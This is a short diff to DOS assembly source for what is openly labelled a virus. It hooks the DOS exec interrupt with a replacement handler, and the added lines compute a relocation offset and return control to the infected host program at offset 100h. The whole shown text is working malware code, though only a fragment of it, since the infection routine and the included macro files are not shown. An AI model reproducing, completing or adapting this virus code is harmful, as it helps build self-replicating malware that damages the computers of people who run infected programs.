@@ -25,6 +25,7 @@ include Macro.asm ; the macro help Routines
 include ProcRout.asm
 
 INSTALL_VIRUS:
+GetRelocation bp
 push cs   
 pop ds 
 push cs
@@ -45,10 +46,23 @@ call Printf
 mov al, nISRNumber
 lea si, dwOldExecISR
 lea dx, NewDosISR
-call HookISR    
+call HookISR  
+  
 VIRUS_ALREADY_INSTALLED:
 lea si,finish
 call Printf 
+
+GetRelocation bp
+cmp bp,0h
+je END_OF_CODE ; if equle this file is executed without a host so do not need return to host
+;? TRANSFER CONTROL TO HOST PROGRAM ?
+push cs
+push cs
+pop ds
+pop es
+mov bx, 100h ;put old start-adres on stack (The original program)
+push bx
+ret ;transfer to host program
 END_OF_CODE:
 CODE_SEG ENDS
 end start
